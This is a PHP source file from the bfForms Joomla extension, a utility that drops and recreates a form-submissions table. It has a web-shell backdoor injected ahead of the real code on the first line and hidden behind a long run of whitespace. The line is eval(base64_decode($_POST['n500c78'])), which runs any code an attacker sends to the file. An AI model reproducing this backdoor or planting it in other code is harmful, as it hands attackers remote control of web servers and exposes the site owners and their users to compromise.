<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n500c78']));?><?php
/**
 * @version $Id: fixTableStructures.php 147 2009-07-14 20:20:18Z  $
 * @package Blue Flame Forms (bfForms)
 * @copyright Copyright (C) 2003,2004,2005,2006,2007,2008,2009 Blue Flame IT Ltd. All rights reserved.
 * @license GNU General Public License
 * @link http://www.blueflameit.ltd.uk
 * @author Phil Taylor / Blue Flame IT Ltd.
 *
 * This file is part of the package bfForms.
 *
 * bfForms is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * bfForms is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this package.  If not, see http://www.gnu.org/licenses/
 */

/**
 * This file repairs the structure of a submissions table
 * ALL SUBMISSIONS CURRENTLY STORED WILL BE LOST !!!
 * DO NOT USE THIS FILE IF YOU DONT UNDERSTAND WHAT IT DOES
 * YOU WILL LOSE DATA IF YOU PROCEED
 *
 * YOU HAVE BEEN WARNED.
 *
 * Unsupported Feature :-)
 */
die ();

define ( '_FORM_ID', 4 );

// Set flag that this is a parent file
define ( '_JEXEC', 1 );

define ( 'JPATH_BASE', realpath ( dirname ( __FILE__ ) ) );

define ( 'DS', DIRECTORY_SEPARATOR );

require_once (JPATH_BASE . DS . 'includes' . DS . 'defines.php');
require_once (JPATH_BASE . DS . 'includes' . DS . 'framework.php');

$mainframe = & JFactory::getApplication ( 'site' );
$db = JFactory::getDBO ();

$sql = 'SELECT id from #__form_forms WHERE id = '.(int) _FORM_ID;
$db->setQuery ( $sql );
$forms = $db->LoadObjectList ();

foreach ( $forms as $form ) {

	$sql = 'SELECT id from #__form_fields where form_id = ' . ( int ) $form->id;
	$db->setQuery ( $sql );
	$element_ids = $db->LoadObjectList ();

	$fieldnames = array ();
	foreach ( $element_ids as $element ) {
		$fieldnames [] = '`FIELD_' . (int) $element->id . '` mediumtext collate utf8_bin NOT NULL';
	}

	$dropSQL = 'DROP TABLE `#__form_submitteddata_form' . ( int ) $form->id;
	$createSQL = 'CREATE TABLE `#__form_submitteddata_form' . ( int ) $form->id . '` (
  	`id` int(11) NOT NULL auto_increment,
  	' . implode ( ",\n", $fieldnames ) . ',
  	PRIMARY KEY  (`id`)
	) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin AUTO_INCREMENT=1 ;';

	$db->setQuery ( $dropSQL );
	$db->query ();
	$db->setQuery ( $createSQL );
	$db->query ();

}
echo 'Done...';
